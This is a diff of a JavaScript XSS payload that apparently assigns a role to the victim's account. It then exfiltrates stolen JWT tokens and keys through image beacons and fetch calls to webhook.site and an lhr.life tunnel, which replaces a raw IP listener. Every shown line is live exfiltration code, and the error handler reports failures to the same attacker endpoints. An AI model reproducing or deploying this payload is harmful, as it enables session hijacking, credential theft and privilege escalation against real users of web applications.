@@ -26,14 +26,14 @@ if(roles.length>0){
   assignStatus=r2.status;
 }
 const params=new URLSearchParams({s:String(assignStatus),r:roleId,j:stolen.jwt?'YES':'NO',jv:stolen.jwt.substring(0,60),ks:stolen.keys});
-const beacons=['https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14','http://94.184.47.185:8888'];
+const beacons=['https://59c3825f19d3f1.lhr.life','https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14'];
 for(const b of beacons){
   try{new Image().src=b+(b.includes('webhook.site')?'?':'/xss?')+params.toString();}catch(x){}
   try{fetch(b+(b.includes('webhook.site')?'?':'/xss?')+params.toString(),{mode:'no-cors'});}catch(x){}
 }
 }catch(e){
   const msg=encodeURIComponent(String(e).substring(0,80));
+  try{new Image().src='https://59c3825f19d3f1.lhr.life/err?e='+msg;}catch(x){}
   try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+msg;}catch(x){}
-  try{new Image().src='http://94.184.47.185:8888/err?e='+msg;}catch(x){}
 }
 })();
